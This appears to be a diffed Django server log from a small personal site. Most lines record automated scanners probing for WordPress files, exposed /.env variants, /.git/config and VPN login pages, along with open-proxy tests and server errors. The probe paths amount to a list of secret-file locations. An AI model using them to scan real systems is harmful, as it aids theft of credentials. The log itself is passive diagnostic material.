+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /robots.txt
+Not Found: /sitemap.xml
+Not Found: /.well-known/security.txt
+[01/Feb/2024 07:05:48] code 400, message Bad request syntax ('MGLNDD_3.36.81.50_8000')
+[01/Feb/2024 07:05:48] "MGLNDD_3.36.81.50_8000" 400 -
+Not Found: /owa/auth/logon.aspx
+[01/Feb/2024 07:34:46] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+[01/Feb/2024 07:34:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 07:41:50] "GET / HTTP/1.1" 200 3786
+Not Found: /.env
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /webui/
+[01/Feb/2024 10:56:52] code 400, message Bad request version ('À\x14À')
+[01/Feb/2024 10:56:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 10:56:52] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x033\x87æ\x98äÿ»á+º\x19\x82§¬,ßÅ7ÍþÔ\x9cî«Y\x88£\x1bHî²Ð\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[01/Feb/2024 10:56:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 10:56:53] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 10:56:54] code 400, message Bad request version ('À\x14À')
+[01/Feb/2024 10:56:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /geoserver/web/
+Not Found: /.git/config
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /robots.txt
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Not Found: /.git/HEAD
+Not Found: /.env
+[01/Feb/2024 12:52:20] code 400, message Bad request version ('À\x14À')
+[01/Feb/2024 12:52:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 12:52:21] code 400, message Bad request version ('À\x14À')
+[01/Feb/2024 12:52:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+[01/Feb/2024 12:52:21] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 12:52:22] code 400, message Bad request version ('À\x14À')
+[01/Feb/2024 12:52:22] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /sitemap.xml
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+Not Found: /license.txt
+Not Found: /site/license.txt
+Not Found: /wordpress/license.txt
+[01/Feb/2024 14:03:25] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 14:03:26] "GET / HTTP/1.1" 200 3786
+Not Found: /favicon.ico
+[01/Feb/2024 14:03:27] "GET /favicon.ico HTTP/1.1" 404 5223
+[01/Feb/2024 14:03:29] "GET /static/bootstrap.min.js HTTP/1.1" 200 60577
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /apple-touch-icon-precomposed.png
+Not Found: /apple-touch-icon.png
+Not Found: /apple-touch-icon-precomposed.png
+Not Found: /apple-touch-icon.png
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /Core/Skin/Login.aspx
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Not Found: /Core/Skin/Login.aspx
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2018/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //media/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /Core/Skin/Login.aspx
+[01/Feb/2024 20:11:35] "GET / HTTP/1.1" 200 3786
+Not Found: /robots.txt
+Not Found: /accounts/login/
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /dqgqoeCXckuwPtxov
+Not Found: /dqgqoeCXckuwPtxov
+[01/Feb/2024 21:58:52,960] - Broken pipe from ('199.45.155.18', 56838)
+[01/Feb/2024 21:58:56] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 21:58:56,160] - Broken pipe from ('199.45.155.18', 33160)
+[01/Feb/2024 21:58:59] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 21:58:59] code 505, message Invalid HTTP version (2.0)
+[01/Feb/2024 21:58:59] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[01/Feb/2024 21:59:00] "GET /favicon.ico HTTP/1.1" 404 5223
+Invalid HTTP_HOST header: 'junnie082:8000'. You may need to add 'junnie082' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'junnie082:8000'. You may need to add 'junnie082' to ALLOWED_HOSTS.
+Bad Request: /
+[01/Feb/2024 22:51:48] "GET / HTTP/1.0" 400 63108
+Not Found: /wp-login.php
+[01/Feb/2024 23:09:49] "GET / HTTP/1.1" 200 3786
+[01/Feb/2024 23:09:50] "GET /common/logout/ HTTP/1.1" 302 0
+[01/Feb/2024 23:09:50] "GET / HTTP/1.1" 200 3786
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Not Found: /webui/
+Not Found: /.git/config
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+[02/Feb/2024 01:02:55] code 400, message Bad request version ('À\x14À')
+[02/Feb/2024 01:02:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[02/Feb/2024 01:02:56] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ã_&VAîz\x040z½D4\x18\x15\x8bê\x1ac\x14¼ù\x9clW®ùõ?ë1~\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[02/Feb/2024 01:02:56] You're accessing the development server over HTTPS, but it only supports HTTP.
+[02/Feb/2024 01:02:57] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 01:02:58] code 400, message Bad request version ('À\x14À')
+[02/Feb/2024 01:02:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /+CSCOE+/logon.html
+Not Found: /vpn/index.html
+Not Found: /global-protect/login.esp
+Not Found: /sslvpn_logon.shtml
+Not Found: /owa/auth/logon.aspx
+Not Found: /actuator/health
+Not Found: /version
+[02/Feb/2024 02:52:36] "GET / HTTP/1.1" 200 3786
+Not Found: /favicon.ico
+[02/Feb/2024 02:52:49] "GET /favicon.ico HTTP/1.1" 404 5223
+Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'api.ipify.org'. You may need to add 'api.ipify.org' to ALLOWED_HOSTS.
+Bad Request: /http:/api.ipify.org/
+[02/Feb/2024 02:52:54] "GET http://api.ipify.org/?format=json HTTP/1.1" 400 63640
+Invalid HTTP_HOST header: 'www.shadowserver.org'. You may need to add 'www.shadowserver.org' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.shadowserver.org'. You may need to add 'www.shadowserver.org' to ALLOWED_HOSTS.
+Bad Request: /www.shadowserver.org:443
+[02/Feb/2024 02:52:57] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 63843
+[02/Feb/2024 03:14:56] "GET / HTTP/1.1" 200 3786
+Not Found: /robots.txt
+Not Found: /humans.txt
+Not Found: /ads.txt
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+[02/Feb/2024 03:56:31] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 03:59:19,521] - Broken pipe from ('167.248.133.126', 53582)
+[02/Feb/2024 03:59:22] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 03:59:22,960] - Broken pipe from ('167.248.133.126', 38626)
+[02/Feb/2024 03:59:28] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 03:59:28] code 505, message Invalid HTTP version (2.0)
+[02/Feb/2024 03:59:28] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[02/Feb/2024 03:59:29] "GET /favicon.ico HTTP/1.1" 404 5223
+[02/Feb/2024 04:36:52] code 400, message Bad request syntax ('MGLNDD_3.36.81.50_8000')
+[02/Feb/2024 04:36:52] "MGLNDD_3.36.81.50_8000" 400 -
+[02/Feb/2024 04:39:11,680] - Broken pipe from ('199.45.155.33', 45978)
+[02/Feb/2024 04:39:14] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 04:39:14,879] - Broken pipe from ('199.45.155.33', 40136)
+[02/Feb/2024 04:39:18] "GET / HTTP/1.1" 200 3786
+[02/Feb/2024 04:39:18] code 505, message Invalid HTTP version (2.0)
+[02/Feb/2024 04:39:18] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[02/Feb/2024 04:39:18] "GET /favicon.ico HTTP/1.1" 404 5223
+[02/Feb/2024 05:01:08] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[02/Feb/2024 05:01:08] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+Not Found: /wp-login.php
+[02/Feb/2024 06:08:55] "GET / HTTP/1.1" 200 3786
+Not Found: /_profiler/empty/search/results
+Not Found: /robots.txt
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:29: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'main.models.Log'> QuerySet.
+  paginatorLog = Paginator(loglist, 5)
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:30: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'board.models.Post'> QuerySet.
+  paginatorPost = Paginator(postlist, 5)
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.env
+Not Found: /3ds1633693954432212
+Not Found: /3ds1633693954432212
+Not Found: /merchant/code
+Not Found: /merchant/code
+Not Found: /3ds.php
+Not Found: /3ds.php
+Not Found: /merchant/z/payment/
+Not Found: /merchant/z/payment/
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+[2024-02-02 17:32:25 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:286226)
+[2024-02-02 17:32:27 +0900] [238462] [ERROR] Worker (pid:286226) was sent SIGKILL! Perhaps out of memory?
+[2024-02-02 17:32:27 +0900] [377603] [INFO] Booting worker with pid: 377603
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:29: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'main.models.Log'> QuerySet.
+  paginatorLog = Paginator(loglist, 5)
+/home/ubuntu/projects/mysite/scoopadive/user_profile/views.py:30: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'board.models.Post'> QuerySet.
+  paginatorPost = Paginator(postlist, 5)
+[2024-02-02 17:37:28 +0900] [238462] [CRITICAL] WORKER TIMEOUT (pid:377603)
+[2024-02-02 08:37:29 +0000] [377603] [INFO] Worker exiting (pid: 377603)
+BASE_DIR: /home/ubuntu/projects/mysite/scoopadive
+STATIC_ROOT: /home/ubuntu/projects/mysite/scoopadive/main/static
+Is not AnonymousUser!
+profile.is_ststMember: True
+Is not AnonymousUser!
+profile.is_ststMember: True
+[2024-02-02 17:37:29 +0900] [238462] [ERROR] Worker (pid:377603) was sent SIGKILL! Perhaps out of memory?
+[2024-02-02 17:37:30 +0900] [377816] [INFO] Booting worker with pid: 377816
+Not Found: /.env
+Not Found: /.env.bak
+Not Found: /.env.dev
+Not Found: /.env.dev.local
+Not Found: /.env.development.local
+Not Found: /.env.prod
+Not Found: /.env.prod.local
+Not Found: /.env.production
+Not Found: /.env.production.local
+Not Found: /.env.local
+Not Found: /.env.example
+Not Found: /.env.stage
+Not Found: /.env.live
+Not Found: /.env.backup
+Not Found: /.env.save
+Not Found: /.env.old
+Not Found: /.env.www
+Not Found: /.env_1
+Not Found: /.env_sample
+Not Found: /.env.81
+Not Found: /.env.3.36
+Not Found: /api/.env
+Not Found: /robots.txt
+Not Found: /.env
+Not Found: //wp-includes/ID3/license.txt
+Not Found: //feed/
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //2021/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: /.env
+Not Found: /P8lh
+Not Found: /Cz5k
+Not Found: /aab8
+Not Found: /jquery-3.3.1.slim.min.js
+Not Found: /aab9
+Not Found: /jquery-3.3.2.slim.min.js
+Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
+    response = self.process_request(request)
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+  File "/home/ubuntu/venvs/mysite/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.scoopadive.com'. You may need to add 'www.scoopadive.com' to ALLOWED_HOSTS.
+Bad Request: /
+Not Found: /sitemap.xml
+Not Found: /robots.txt
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
+Not Found: //wp2/wp-includes/wlwmanifest.xml
+Not Found: //site/wp-includes/wlwmanifest.xml
+Not Found: //cms/wp-includes/wlwmanifest.xml
+Not Found: //sito/wp-includes/wlwmanifest.xml
+Not Found: /.env
+Forbidden (Referer checking failed - no Referer.): /
+Not Found: //wp-includes/wlwmanifest.xml
+Not Found: //xmlrpc.php
+Not Found: //blog/wp-includes/wlwmanifest.xml
+Not Found: //web/wp-includes/wlwmanifest.xml
+Not Found: //wordpress/wp-includes/wlwmanifest.xml
+Not Found: //website/wp-includes/wlwmanifest.xml
+Not Found: //wp/wp-includes/wlwmanifest.xml
+Not Found: //news/wp-includes/wlwmanifest.xml
+Not Found: //2020/wp-includes/wlwmanifest.xml
+Not Found: //2019/wp-includes/wlwmanifest.xml
+Not Found: //shop/wp-includes/wlwmanifest.xml
+Not Found: //wp1/wp-includes/wlwmanifest.xml
+Not Found: //test/wp-includes/wlwmanifest.xml
